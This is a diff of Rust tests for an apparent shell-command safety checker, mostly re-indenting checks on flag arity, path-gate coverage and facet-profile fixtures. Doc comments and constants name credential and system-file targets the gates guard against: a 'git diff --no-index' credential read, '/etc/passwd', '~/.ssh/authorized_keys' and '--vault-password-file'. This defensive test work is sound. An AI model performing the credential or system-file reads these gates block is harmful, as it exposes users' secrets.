+            let mut scopes: Vec<(String, &Vec<String>, &Vec<String>)> = vec![(cmd.name.clone(), &cmd.standalone, &cmd.valued)];
+            for sub in &cmd.sub {
+                scopes.push((format!("{} {}", cmd.name, sub.name), &sub.standalone, &sub.valued));
             }
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        // flag -> (scopes declaring it standalone, count of scopes declaring it valued)
-        let mut standalone_scopes: HashMap<String, Vec<String>> = HashMap::new();
-        let mut valued_count: HashMap<String, usize> = HashMap::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                let mut scopes: Vec<(String, &Vec<String>, &Vec<String>)> =
-                    vec![(cmd.name.clone(), &cmd.standalone, &cmd.valued)];
-                for sub in &cmd.sub {
-                    scopes
-                        .push((format!("{} {}", cmd.name, sub.name), &sub.standalone, &sub.valued));
-                }
-                for (scope, st, va) in scopes {
-                    for f in st {
-                        // A flag in BOTH lists is an optional-value declaration, not a
-                        // standalone one — it is the `optional_valued` shape spelled the old way,
-                        // and counting it here would report every such scope as a mismodelling.
-                        if f.starts_with("--") && !va.contains(f) {
-                            standalone_scopes.entry(f.clone()).or_default().push(scope.clone());
-                        }
+            for (scope, st, va) in scopes {
+                for f in st {
+                    // A flag in BOTH lists is an optional-value declaration, not a
+                    // standalone one — it is the `optional_valued` shape spelled the old way,
+                    // and counting it here would report every such scope as a mismodelling.
+                    if f.starts_with("--") && !va.contains(f) {
+                        standalone_scopes.entry(f.clone()).or_default().push(scope.clone());
                     }
-                    for f in va {
-                        if f.starts_with("--") && !st.contains(f) {
-                            *valued_count.entry(f.clone()).or_default() += 1;
-                        }
+                }
+                for f in va {
+                    if f.starts_with("--") && !st.contains(f) {
+                        *valued_count.entry(f.clone()).or_default() += 1;
                     }
                 }
             }
         }
+    }
 
-        let mut candidates: HashSet<(String, String)> = HashSet::new();
-        for (flag, scopes) in &standalone_scopes {
-            let valued = valued_count.get(flag).copied().unwrap_or(0);
-            if valued >= 5 && scopes.len() * 6 <= valued {
-                for scope in scopes {
-                    candidates.insert((scope.clone(), flag.clone()));
-                }
+    let mut candidates: HashSet<(String, String)> = HashSet::new();
+    for (flag, scopes) in &standalone_scopes {
+        let valued = valued_count.get(flag).copied().unwrap_or(0);
+        if valued >= 5 && scopes.len() * 6 <= valued {
+            for scope in scopes {
+                candidates.insert((scope.clone(), flag.clone()));
             }
         }
+    }
 
-        let fixture = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
-            .join("tests/fixtures/flag_arity_worklist.tsv");
-        let raw = std::fs::read_to_string(&fixture).expect("read flag_arity_worklist.tsv");
-        let listed: HashSet<(String, String)> = raw
-            .lines()
-            .filter(|l| !l.starts_with('#') && !l.trim().is_empty())
-            .filter_map(|l| l.split_once('\t'))
-            .map(|(scope, flag)| (scope.trim().to_string(), flag.trim().to_string()))
-            .collect();
+    let fixture = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/flag_arity_worklist.tsv");
+    let raw = std::fs::read_to_string(&fixture).expect("read flag_arity_worklist.tsv");
+    let listed: HashSet<(String, String)> = raw
+        .lines()
+        .filter(|l| !l.starts_with('#') && !l.trim().is_empty())
+        .filter_map(|l| l.split_once('\t'))
+        .map(|(scope, flag)| (scope.trim().to_string(), flag.trim().to_string()))
+        .collect();
 
-        let mut unlisted: Vec<String> = candidates
-            .difference(&listed)
-            .map(|(s, f)| format!("  {s}\t{f}"))
-            .collect();
-        let mut stale: Vec<String> = listed
-            .difference(&candidates)
-            .map(|(s, f)| format!("  {s}\t{f}"))
-            .collect();
-        unlisted.sort();
-        stale.sort();
+    let mut unlisted: Vec<String> = candidates.difference(&listed).map(|(s, f)| format!("  {s}\t{f}")).collect();
+    let mut stale: Vec<String> = listed.difference(&candidates).map(|(s, f)| format!("  {s}\t{f}")).collect();
+    unlisted.sort();
+    stale.sort();
 
-        assert!(
-            !listed.is_empty(),
-            "flag_arity_worklist.tsv has no rows — the guard would be vacuous"
-        );
-        assert!(
-            unlisted.is_empty(),
-            "these scopes declare a long flag `standalone` that is `valued` in many other \
+    assert!(!listed.is_empty(), "flag_arity_worklist.tsv has no rows — the guard would be vacuous");
+    assert!(
+        unlisted.is_empty(),
+        "these scopes declare a long flag `standalone` that is `valued` in many other \
              commands, and are not on the worklist ({}). Check the tool's grammar: move the flag \
              to `valued` (or `optional_valued`), or add the row with a note saying the \
              declaration is right:\n{}",
-            unlisted.len(),
-            unlisted.join("\n"),
-        );
-        assert!(
-            stale.is_empty(),
-            "these worklist rows are no longer candidates ({}) — the declaration was fixed, so \
+        unlisted.len(),
+        unlisted.join("\n"),
+    );
+    assert!(
+        stale.is_empty(),
+        "these worklist rows are no longer candidates ({}) — the declaration was fixed, so \
              delete the row in the same change and keep the file from rotting into a list of \
              things that used to be true:\n{}",
-            stale.len(),
-            stale.join("\n"),
-        );
+        stale.len(),
+        stale.join("\n"),
+    );
+}
+
+#[test]
+fn optional_valued_is_not_also_declared_standalone_or_valued() {
+    use super::types::TomlFile;
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
     }
 
-    #[test]
-    fn optional_valued_is_not_also_declared_standalone_or_valued() {
-        use super::types::TomlFile;
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+    let mut declared = 0usize;
+    let mut dupes: Vec<String> = Vec::new();
+    let mut check = |scope: String, opt: &[String], standalone: &[String], valued: &[String]| {
+        declared += opt.len();
+        for flag in opt {
+            if standalone.contains(flag) {
+                dupes.push(format!("  {scope}: `{flag}` in optional_valued AND standalone"));
+            }
+            if valued.contains(flag) {
+                dupes.push(format!("  {scope}: `{flag}` in optional_valued AND valued"));
             }
         }
+    };
 
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        let mut declared = 0usize;
-        let mut dupes: Vec<String> = Vec::new();
-        let mut check = |scope: String, opt: &[String], standalone: &[String], valued: &[String]| {
-            declared += opt.len();
-            for flag in opt {
-                if standalone.contains(flag) {
-                    dupes.push(format!("  {scope}: `{flag}` in optional_valued AND standalone"));
-                }
-                if valued.contains(flag) {
-                    dupes.push(format!("  {scope}: `{flag}` in optional_valued AND valued"));
-                }
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
+            check(cmd.name.clone(), &cmd.optional_valued, &cmd.standalone, &cmd.valued);
+            for sub in &cmd.sub {
+                check(format!("{} {}", cmd.name, sub.name), &sub.optional_valued, &sub.standalone, &sub.valued);
             }
-        };
-
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                check(cmd.name.clone(), &cmd.optional_valued, &cmd.standalone, &cmd.valued);
-                for sub in &cmd.sub {
-                    check(
-                        format!("{} {}", cmd.name, sub.name),
-                        &sub.optional_valued,
-                        &sub.standalone,
-                        &sub.valued,
-                    );
-                }
-                if let Some(fb) = &cmd.fallback {
-                    check(
-                        format!("{} [fallback]", cmd.name),
-                        &fb.optional_valued,
-                        &fb.standalone,
-                        &fb.valued,
-                    );
-                }
+            if let Some(fb) = &cmd.fallback {
+                check(format!("{} [fallback]", cmd.name), &fb.optional_valued, &fb.standalone, &fb.valued);
             }
         }
+    }
 
-        assert!(
-            declared > 0,
-            "no scope declares `optional_valued` — this guard is vacuous, and the field it \
+    assert!(
+        declared > 0,
+        "no scope declares `optional_valued` — this guard is vacuous, and the field it \
              protects is unused"
-        );
-        assert!(
-            dupes.is_empty(),
-            "`optional_valued` already implies both other lists, so declaring the flag again \
+    );
+    assert!(
+        dupes.is_empty(),
+        "`optional_valued` already implies both other lists, so declaring the flag again \
              restores the ambiguity the field removes ({}):\n{}",
-            dupes.len(),
-            dupes.join("\n"),
-        );
-    }
+        dupes.len(),
+        dupes.join("\n"),
+    );
+}
 
-    /// The four spellings of an `optional_valued` flag, end to end through a real command rather
-    /// than a synthetic policy — so the field is proven where it is actually consumed.
-    #[test]
-    fn optional_valued_admits_the_bare_and_glued_spellings() {
-        // `cargo mutants` carries `max_positional = 0`, which is what makes the fourth case below
-        // meaningful: with no positional allowed, a token the bare flag wrongly swallowed would
-        // vanish from the count and the invocation would pass. On a command that tolerates a
-        // positional the same probe proves nothing — it passes either way.
-        assert!(crate::is_safe_command("cargo mutants --gitignore"), "bare spelling");
-        assert!(crate::is_safe_command("cargo mutants --gitignore=false"), "glued spelling");
-        assert!(crate::is_safe_command("cargo mutants --cap-lints=warn"), "glued, non-boolean value");
-        assert!(
-            !crate::is_safe_command("cargo mutants --gitignore somefile"),
-            "the bare form must not consume the next token as its value"
-        );
+/// The four spellings of an `optional_valued` flag, end to end through a real command rather
+/// than a synthetic policy — so the field is proven where it is actually consumed.
+#[test]
+fn optional_valued_admits_the_bare_and_glued_spellings() {
+    // `cargo mutants` carries `max_positional = 0`, which is what makes the fourth case below
+    // meaningful: with no positional allowed, a token the bare flag wrongly swallowed would
+    // vanish from the count and the invocation would pass. On a command that tolerates a
+    // positional the same probe proves nothing — it passes either way.
+    assert!(crate::is_safe_command("cargo mutants --gitignore"), "bare spelling");
+    assert!(crate::is_safe_command("cargo mutants --gitignore=false"), "glued spelling");
+    assert!(crate::is_safe_command("cargo mutants --cap-lints=warn"), "glued, non-boolean value");
+    assert!(!crate::is_safe_command("cargo mutants --gitignore somefile"), "the bare form must not consume the next token as its value");
 
-        // And the same grammar reached through a sub rather than a command.
-        assert!(crate::is_safe_command("ghostty +list-fonts --bold"), "bare, on a sub");
-        assert!(crate::is_safe_command("ghostty +list-fonts --bold=true"), "glued, on a sub");
-    }
+    // And the same grammar reached through a sub rather than a command.
+    assert!(crate::is_safe_command("ghostty +list-fonts --bold"), "bare, on a sub");
+    assert!(crate::is_safe_command("ghostty +list-fonts --bold=true"), "glued, on a sub");
+}
 
-    #[test]
-    fn a_sub_scoped_gate_covers_every_spelling_of_its_sub() {
-        use super::types::TomlFile;
+#[test]
+fn a_sub_scoped_gate_covers_every_spelling_of_its_sub() {
+    use super::types::TomlFile;
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
             }
         }
-
-        let keys: std::collections::HashSet<String> =
-            crate::pathgate::sub_scoped_keys().into_iter().collect();
-        if keys.is_empty() {
-            panic!("no sub-scoped gates found — this guard would be vacuous");
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        let mut missing: Vec<String> = Vec::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                for sub in &cmd.sub {
-                    let spellings: Vec<&String> =
-                        std::iter::once(&sub.name).chain(sub.aliases.iter()).collect();
-                    let gated: Vec<&&String> = spellings
-                        .iter()
-                        .filter(|s| keys.contains(&format!("{} {}", cmd.name, s)))
-                        .collect();
-                    if gated.is_empty() || gated.len() == spellings.len() {
-                        continue;
-                    }
-                    let absent: Vec<&str> = spellings
-                        .iter()
-                        .filter(|s| !keys.contains(&format!("{} {}", cmd.name, s)))
-                        .map(|s| s.as_str())
-                        .collect();
-                    missing.push(format!(
-                        "  [roles.\"{} {}\"] is gated but these spellings of the same sub are NOT: {}",
-                        cmd.name,
-                        gated.first().expect("non-empty"),
-                        absent.join(", "),
-                    ));
-                }
-            }
-        }
-
-        missing.sort();
-        assert!(
-            missing.is_empty(),
-            "sub-scoped gates that cover only some spellings of their sub ({}) — an alias reaches \
-             the same code, so add a `[roles.\"<cmd> <alias>\"]` for each:\n{}",
-            missing.len(),
-            missing.join("\n"),
-        );
     }
 
-    /// Parse `path_named_flag_facets.tsv`, returning the recorded keys and any authoring errors.
-    ///
-    /// The facet vocabularies are checked against the engine's OWN terms (src/engine/facet.rs), so
-    /// a profile cannot drift from the model it claims to be written in: an invented term is a
-    /// build error rather than a plausible-looking string nobody re-checks.
-    #[allow(clippy::type_complexity)]
-    fn parse_facet_fixture() -> (std::collections::HashSet<(String, String)>, Vec<String>) {
-        const DISPOSITIONS: &[&str] = &["untriaged", "not-a-path", "in-workspace", "pending-gate"];
-        const OPERATIONS: &[&str] = &[
-            "observe", "create", "mutate", "destroy", "execute", "communicate", "configure",
-            "authorize", "control",
-        ];
-        const LOCI: &[&str] = &[
-            "process", "temp", "sandbox-scope", "worktree", "adjacent", "worktree-trusted", "user",
-            "machine", "system-integrity", "device", "kernel",
-        ];
-        const PERSISTENCE: &[&str] = &["transient", "data", "reconfiguring", "installing"];
+    let keys: std::collections::HashSet<String> = crate::pathgate::sub_scoped_keys().into_iter().collect();
+    if keys.is_empty() {
+        panic!("no sub-scoped gates found — this guard would be vacuous");
+    }
 
-        let raw = include_str!("../../tests/fixtures/path_named_flag_facets.tsv");
-        let mut listed: std::collections::HashSet<(String, String)> = Default::default();
-        let mut bad: Vec<String> = Vec::new();
-        for line in raw.lines() {
-            if line.trim().is_empty() || line.starts_with('#') {
-                continue;
-            }
-            let f: Vec<&str> = line.split('\t').collect();
-            if f.len() < 6 {
-                bad.push(format!("  {line} — expected 7 tab-separated columns"));
-                continue;
-            }
-            let (scope, flag, disp, op, locus, persist) = (f[0], f[1], f[2], f[3], f[4], f[5]);
-            let note = f.get(6).copied().unwrap_or("").trim();
-            listed.insert((scope.to_string(), flag.to_string()));
-            if !DISPOSITIONS.contains(&disp) {
-                bad.push(format!("  {scope} `{flag}` — unknown disposition `{disp}`"));
-                continue;
-            }
-            // `untriaged` has no claim to make; `not-a-path` says the value is not a filesystem
-            // location, so there is no capability to profile and demanding facet terms for one
-            // would invite invented ones. Both leave the columns as `-`; only `not-a-path` owes an
-            // explanation.
-            if disp == "untriaged" || disp == "not-a-path" {
-                if op != "-" || locus != "-" || persist != "-" {
-                    bad.push(format!(
-                        "  {scope} `{flag}` — `{disp}` rows describe no capability, so the facet \
-                         columns must stay `-`"
-                    ));
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+
+    let mut missing: Vec<String> = Vec::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
+            for sub in &cmd.sub {
+                let spellings: Vec<&String> = std::iter::once(&sub.name).chain(sub.aliases.iter()).collect();
+                let gated: Vec<&&String> = spellings.iter().filter(|s| keys.contains(&format!("{} {}", cmd.name, s))).collect();
+                if gated.is_empty() || gated.len() == spellings.len() {
+                    continue;
                 }
-                if disp == "not-a-path" && note.is_empty() {
-                    bad.push(format!(
-                        "  {scope} `{flag}` — a not-a-path row must say what the value IS"
-                    ));
-                }
-                continue;
-            }
-            for (label, value, vocab) in [
-                ("operation", op, OPERATIONS),
-                ("locus", locus, LOCI),
-                ("persistence", persist, PERSISTENCE),
-            ] {
-                if !vocab.contains(&value) {
-                    bad.push(format!(
-                        "  {scope} `{flag}` — `{value}` is not a valid {label} (see src/engine/facet.rs)"
-                    ));
-                }
-            }
-            if note.is_empty() {
-                bad.push(format!(
-                    "  {scope} `{flag}` — a triaged row must record the evidence in the note column"
+                let absent: Vec<&str> = spellings
+                    .iter()
+                    .filter(|s| !keys.contains(&format!("{} {}", cmd.name, s)))
+                    .map(|s| s.as_str())
+                    .collect();
+                missing.push(format!(
+                    "  [roles.\"{} {}\"] is gated but these spellings of the same sub are NOT: {}",
+                    cmd.name,
+                    gated.first().expect("non-empty"),
+                    absent.join(", "),
                 ));
             }
         }
-        (listed, bad)
     }
 
-    /// A `positional` path gate must declare a role for EVERY valued flag its scope declares.
-    ///
-    /// A positional gate is not confined to positionals. The walk gates each valued flag's VALUE
-    /// too, so an undeclared valued flag has its value treated as a path. That is fail-closed, and
-    /// it is still a bug: `git diff -S /etc/passwd` searches the diff for a path-shaped literal and
-    /// reads nothing, yet it denied the moment `git diff`'s positionals were gated to close the
-    /// `--no-index` credential read. Twenty-six roles were then added by hand, which is exactly the
-    /// kind of enumeration that rots — git adds a valued flag, or the next author gates a different
-    /// flag-rich sub, and the false deny comes back silently.
-    ///
-    /// So the completeness is mechanical: the scope's `valued` list is the population, and each
-    /// entry must appear in the gate's `flags` map with SOME role. `ignore` is the honest answer for
-    /// a count, a mode name or a search string, and saying so is cheap; leaving it out is what
-    /// cannot be told apart from an oversight.
-    #[test]
-    fn a_positional_gate_declares_a_role_for_every_valued_flag_in_its_scope() {
-        use super::types::TomlFile;
+    missing.sort();
+    assert!(
+        missing.is_empty(),
+        "sub-scoped gates that cover only some spellings of their sub ({}) — an alias reaches \
+             the same code, so add a `[roles.\"<cmd> <alias>\"]` for each:\n{}",
+        missing.len(),
+        missing.join("\n"),
+    );
+}
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+/// Parse `path_named_flag_facets.tsv`, returning the recorded keys and any authoring errors.
+///
+/// The facet vocabularies are checked against the engine's OWN terms (src/engine/facet.rs), so
+/// a profile cannot drift from the model it claims to be written in: an invented term is a
+/// build error rather than a plausible-looking string nobody re-checks.
+#[allow(clippy::type_complexity)]
+fn parse_facet_fixture() -> (std::collections::HashSet<(String, String)>, Vec<String>) {
+    const DISPOSITIONS: &[&str] = &["untriaged", "not-a-path", "in-workspace", "pending-gate"];
+    const OPERATIONS: &[&str] = &["observe", "create", "mutate", "destroy", "execute", "communicate", "configure", "authorize", "control"];
+    const LOCI: &[&str] = &[
+        "process", "temp", "sandbox-scope", "worktree", "adjacent", "worktree-trusted", "user", "machine", "system-integrity", "device",
+        "kernel",
+    ];
+    const PERSISTENCE: &[&str] = &["transient", "data", "reconfiguring", "installing"];
+
+    let raw = include_str!("../../tests/fixtures/path_named_flag_facets.tsv");
+    let mut listed: std::collections::HashSet<(String, String)> = Default::default();
+    let mut bad: Vec<String> = Vec::new();
+    for line in raw.lines() {
+        if line.trim().is_empty() || line.starts_with('#') {
+            continue;
+        }
+        let f: Vec<&str> = line.split('\t').collect();
+        if f.len() < 6 {
+            bad.push(format!("  {line} — expected 7 tab-separated columns"));
+            continue;
+        }
+        let (scope, flag, disp, op, locus, persist) = (f[0], f[1], f[2], f[3], f[4], f[5]);
+        let note = f.get(6).copied().unwrap_or("").trim();
+        listed.insert((scope.to_string(), flag.to_string()));
+        if !DISPOSITIONS.contains(&disp) {
+            bad.push(format!("  {scope} `{flag}` — unknown disposition `{disp}`"));
+            continue;
+        }
+        // `untriaged` has no claim to make; `not-a-path` says the value is not a filesystem
+        // location, so there is no capability to profile and demanding facet terms for one
+        // would invite invented ones. Both leave the columns as `-`; only `not-a-path` owes an
+        // explanation.
+        if disp == "untriaged" || disp == "not-a-path" {
+            if op != "-" || locus != "-" || persist != "-" {
+                bad.push(format!(
+                    "  {scope} `{flag}` — `{disp}` rows describe no capability, so the facet \
+                         columns must stay `-`"
+                ));
+            }
+            if disp == "not-a-path" && note.is_empty() {
+                bad.push(format!("  {scope} `{flag}` — a not-a-path row must say what the value IS"));
+            }
+            continue;
+        }
+        for (label, value, vocab) in [("operation", op, OPERATIONS), ("locus", locus, LOCI), ("persistence", persist, PERSISTENCE)] {
+            if !vocab.contains(&value) {
+                bad.push(format!("  {scope} `{flag}` — `{value}` is not a valid {label} (see src/engine/facet.rs)"));
             }
         }
+        if note.is_empty() {
+            bad.push(format!("  {scope} `{flag}` — a triaged row must record the evidence in the note column"));
+        }
+    }
+    (listed, bad)
+}
 
-        fn collect(prefix: &str, subs: &[TomlSub], out: &mut Vec<(String, Vec<String>)>) {
-            for sub in subs {
-                let label = format!("{prefix} {}", sub.name);
-                out.push((label.clone(), sub.valued.clone()));
-                collect(&label, &sub.sub, out);
+/// A `positional` path gate must declare a role for EVERY valued flag its scope declares.
+///
+/// A positional gate is not confined to positionals. The walk gates each valued flag's VALUE
+/// too, so an undeclared valued flag has its value treated as a path. That is fail-closed, and
+/// it is still a bug: `git diff -S /etc/passwd` searches the diff for a path-shaped literal and
+/// reads nothing, yet it denied the moment `git diff`'s positionals were gated to close the
+/// `--no-index` credential read. Twenty-six roles were then added by hand, which is exactly the
+/// kind of enumeration that rots — git adds a valued flag, or the next author gates a different
+/// flag-rich sub, and the false deny comes back silently.
+///
+/// So the completeness is mechanical: the scope's `valued` list is the population, and each
+/// entry must appear in the gate's `flags` map with SOME role. `ignore` is the honest answer for
+/// a count, a mode name or a search string, and saying so is cheap; leaving it out is what
+/// cannot be told apart from an oversight.
+#[test]
+fn a_positional_gate_declares_a_role_for_every_valued_flag_in_its_scope() {
+    use super::types::TomlFile;
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
             }
         }
+    }
 
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
+    fn collect(prefix: &str, subs: &[TomlSub], out: &mut Vec<(String, Vec<String>)>) {
+        for sub in subs {
+            let label = format!("{prefix} {}", sub.name);
+            out.push((label.clone(), sub.valued.clone()));
+            collect(&label, &sub.sub, out);
+        }
+    }
 
-        let mut valued_by_scope: std::collections::HashMap<String, Vec<String>> = Default::default();
-        for file in &files {
-            let src = std::fs::read_to_string(file).expect("read toml");
-            let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
-            for cmd in &parsed.command {
-                let mut scopes = vec![(cmd.name.clone(), cmd.valued.clone())];
-                collect(&cmd.name, &cmd.sub, &mut scopes);
-                for (label, valued) in scopes {
-                    valued_by_scope.entry(label).or_default().extend(valued);
-                }
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+
+    let mut valued_by_scope: std::collections::HashMap<String, Vec<String>> = Default::default();
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
+            let mut scopes = vec![(cmd.name.clone(), cmd.valued.clone())];
+            collect(&cmd.name, &cmd.sub, &mut scopes);
+            for (label, valued) in scopes {
+                valued_by_scope.entry(label).or_default().extend(valued);
             }
         }
+    }
 
-        // The 157 that predate the guard are latent, not live — `--max-line-length 100` is not
-        // path-shaped, so the gate never fires on it — and classifying them all is a research
-        // campaign of the same kind as path_named_flag_facets.tsv. So the fixture CAPS the backlog
-        // rather than listing work: a new gate must declare its scope's valued flags, and a row
-        // leaves by being given a role.
-        let known: std::collections::HashSet<(String, String)> =
-            include_str!("../../tests/fixtures/positional_gate_undeclared_flags.tsv")
-                .lines()
-                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
-                .filter_map(|l| l.split_once('\t'))
-                .map(|(s, f)| (s.to_string(), f.to_string()))
-                .collect();
+    // The 157 that predate the guard are latent, not live — `--max-line-length 100` is not
+    // path-shaped, so the gate never fires on it — and classifying them all is a research
+    // campaign of the same kind as path_named_flag_facets.tsv. So the fixture CAPS the backlog
+    // rather than listing work: a new gate must declare its scope's valued flags, and a row
+    // leaves by being given a role.
+    let known: std::collections::HashSet<(String, String)> = include_str!("../../tests/fixtures/positional_gate_undeclared_flags.tsv")
+        .lines()
+        .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
+        .filter_map(|l| l.split_once('\t'))
+        .map(|(s, f)| (s.to_string(), f.to_string()))
+        .collect();
 
-        let mut found: std::collections::HashSet<(String, String)> = Default::default();
-        let mut checked = 0usize;
-        for (scope, declared) in crate::pathgate::central_positional_gates() {
-            // Only scopes whose grammar we can read. A gate on a command defined by a Rust handler
-            // has no TOML `valued` list to compare against, so it is skipped rather than guessed at.
-            let Some(valued) = valued_by_scope.get(&scope) else { continue };
-            checked += 1;
-            for flag in valued {
-                if !declared.contains(flag) {
-                    found.insert((scope.clone(), flag.clone()));
-                }
+    let mut found: std::collections::HashSet<(String, String)> = Default::default();
+    let mut checked = 0usize;
+    for (scope, declared) in crate::pathgate::central_positional_gates() {
+        // Only scopes whose grammar we can read. A gate on a command defined by a Rust handler
+        // has no TOML `valued` list to compare against, so it is skipped rather than guessed at.
+        let Some(valued) = valued_by_scope.get(&scope) else { continue };
+        checked += 1;
+        for flag in valued {
+            if !declared.contains(flag) {
+                found.insert((scope.clone(), flag.clone()));
             }
         }
+    }
 
-        let mut new: Vec<_> = found.difference(&known).collect();
-        new.sort();
-        assert!(
-            new.is_empty(),
-            "a `positional` path gate gates its valued flags' VALUES too, so each needs a declared \
+    let mut new: Vec<_> = found.difference(&known).collect();
+    new.sort();
+    assert!(
+        new.is_empty(),
+        "a `positional` path gate gates its valued flags' VALUES too, so each needs a declared \
              role — `read`/`write` if the value is a path, `ignore` if it is a count, mode, enum, \
              regex or search string. NEW undeclared ({}):\n{}",
-            new.len(),
-            new.iter().map(|(s, f)| format!("  {s} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
+        new.len(),
+        new.iter().map(|(s, f)| format!("  {s} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
 
-        let mut stale: Vec<_> = known.difference(&found).collect();
-        stale.sort();
-        assert!(
-            stale.is_empty(),
-            "recorded rows that now DO have a role — delete them from \
+    let mut stale: Vec<_> = known.difference(&found).collect();
+    stale.sort();
+    assert!(
+        stale.is_empty(),
+        "recorded rows that now DO have a role — delete them from \
              tests/fixtures/positional_gate_undeclared_flags.tsv ({}):\n{}",
-            stale.len(),
-            stale.iter().map(|(s, f)| format!("  {s} `{f}`")).collect::<Vec<_>>().join("\n"),
-        );
-        assert!(checked > 0, "no positional gate matched a TOML scope — the guard is vacuous");
+        stale.len(),
+        stale.iter().map(|(s, f)| format!("  {s} `{f}`")).collect::<Vec<_>>().join("\n"),
+    );
+    assert!(checked > 0, "no positional gate matched a TOML scope — the guard is vacuous");
+}
+
+/// A flag whose NAME says it carries a path must have its capability RECORDED — operation,
+/// locus rung and persistence — not merely be judged write-or-not.
+///
+/// The output-flag sweep asks "does this flag write?", which is the legacy band's question and
+/// cannot record WHY something is safe. That flattens three different capabilities into one
+/// row type, and the flattening mis-triages:
+///
+///   --cache-dir / --build-path      create · user · persists as DATA
+///   --conf-path / --config-file     CONFIGURE · persists by RECONFIGURING future commands —
+///                                   a strictly worse capability, and one `Role` cannot express
+///   --vault-password-file           a SECRET READ on the disclosure axis, not a write at all
+///
+/// So every candidate must declare its facet profile, and the vocabulary is validated against
+/// the engine's own enums — an unfilled or invented term is a build error rather than a vague
+/// "verified format-only" that nobody can re-check.
+#[test]
+fn a_path_named_flag_records_its_facet_profile() {
+    use super::types::TomlFile;
+    const SENSITIVE: &str = "~/.ssh/authorized_keys";
+    // Population selector, NOT a safety judgement: a name saying "this value is a filesystem
+    // location". Under-selecting only leaves a flag unswept (it is never a claim of safety), so
+    // the list is deliberately plain rather than clever.
+    const PATH_NAMED: &[&str] = &["dir", "Dir", "path", "Path", "file", "File", "folder", "Folder"];
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
     }
 
-    /// A flag whose NAME says it carries a path must have its capability RECORDED — operation,
-    /// locus rung and persistence — not merely be judged write-or-not.
-    ///
-    /// The output-flag sweep asks "does this flag write?", which is the legacy band's question and
-    /// cannot record WHY something is safe. That flattens three different capabilities into one
-    /// row type, and the flattening mis-triages:
-    ///
-    ///   --cache-dir / --build-path      create · user · persists as DATA
-    ///   --conf-path / --config-file     CONFIGURE · persists by RECONFIGURING future commands —
-    ///                                   a strictly worse capability, and one `Role` cannot express
-    ///   --vault-password-file           a SECRET READ on the disclosure axis, not a write at all
-    ///
